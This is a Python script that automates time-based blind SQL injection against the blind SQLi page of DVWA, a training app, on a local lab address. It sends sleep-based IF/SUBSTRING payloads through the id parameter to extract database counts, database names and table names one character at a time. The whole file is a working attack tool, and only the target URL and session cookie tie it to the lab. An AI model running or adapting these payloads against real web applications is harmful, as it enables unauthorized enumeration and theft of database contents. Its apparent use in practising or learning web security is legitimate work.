import requests
import string
import time

URL = "http://192.168.115.134/DVWA/vulnerabilities/sqli_blind/"
COOKIES = {"security": "low", "PHPSESSID": "e93fgobc77htjoph5d8cdjd8vp"}


def send_request(payload):
    start_time = time.time()
    _ = requests.get(URL, params={"id": payload, "Submit": "Submit"}, cookies=COOKIES)
    request_time = time.time() - start_time
    # print(f"{payload} - {request_time}")
    return request_time > 0.2


def get_data_length(query):
    length = 1

    while True:
        payload = f"1' AND IF((LENGTH(({query}))={length}), sleep(0.2), 1)-- -"
        if send_request(payload):
            break
        length += 1

    return length


def extract_data(query, length):
    result = ""

    for position in range(1, length + 1):
        for (
            char
        ) in (
            string.digits
        ):  # Since the result is a number, we only need to check digits
            payload = f"1' AND IF(SUBSTRING(({query}),{position},1)='{char}', sleep(0.2), 1)-- -"
            if send_request(payload):
                result += char
                break

    return result


def get_number_of_databases():
    query = "SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA"
    length = get_data_length(query)
    db_count_str = extract_data(query, length)

    return int(db_count_str)  # Convert the extracted string to an integer


def get_database_name_length(index):
    length = 1
    while True:
        payload = f"1' AND IF((LENGTH((SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA LIMIT {index},1))={length}), sleep(0.2), 1)-- -"
        if send_request(payload):
            break
        length += 1
    print(f"[+] Length of database name {index}: {length}")
    return length


def get_database_name(index, length):
    result = ""
    for position in range(1, length + 1):
        for char in string.ascii_letters + string.digits + "_":
            payload = f"1' AND IF(SUBSTRING((SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA LIMIT {index},1),{position},1)='{char}', sleep(0.2), 1)-- -"
            if send_request(payload):
                result += char
                break
    print(f"[+] Database name {index}: {result}")
    return result


def get_database_names(db_count):
    db_names = []
    for index in range(db_count):
        name_length = get_database_name_length(index)
        name = get_database_name(index, name_length)
        db_names.append(name)
    return db_names


def get_table_name_length(db_name, index):
    length = 1
    while True:
        payload = f"1' AND IF((LENGTH((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='{db_name}' LIMIT {index},1))={length}), sleep(0.2), 1)-- -"
        if send_request(payload):
            break
        length += 1
    return length


def get_table_name(db_name, index, length):
    result = ""
    for position in range(1, length + 1):
        for char in string.ascii_letters + string.digits + "_":
            payload = f"1' AND IF(SUBSTRING((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='{db_name}' LIMIT {index},1),{position},1)='{char}', sleep(0.2), 1)-- -"
            if send_request(payload):
                result += char
                break
    print(f"[+] Table name {index} in database {db_name}: {result}")
    return result


def get_number_of_tables_in_db(db_name):
    table_count_query = (
        f"SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='{db_name}'"
    )
    length = get_data_length(table_count_query)
    table_count_str = extract_data(table_count_query, length)
    return int(table_count_str)


def get_table_names(db_name):
    table_count = get_number_of_tables_in_db(db_name)
    print(f"[+] Number of tables in database {db_name}: {table_count}")

    table_names = []
    for index in range(table_count):
        table_name_length = get_table_name_length(db_name, index)
        table_name = get_table_name(db_name, index, table_name_length)
        table_names.append(table_name)
    return table_names


def get_all_table_names(db_names):
    all_table_names = {}
    for db_name in db_names:
        print(f"[+] Getting table names for database {db_name}")
        table_names = get_table_names(db_name)
        all_table_names[db_name] = table_names
    return all_table_names


def main():
    db_count = get_number_of_databases()
    print(f"[+] Number of databases: {db_count}")
    db_names = get_database_names(db_count)
    print(f"[+] Database names: {', '.join(db_names)}")
    all_table_names = get_all_table_names(db_names)
    for db_name, table_names in all_table_names.items():
        print(f"[+] Tables in database {db_name}: {', '.join(table_names)}")


if __name__ == "__main__":
    main()
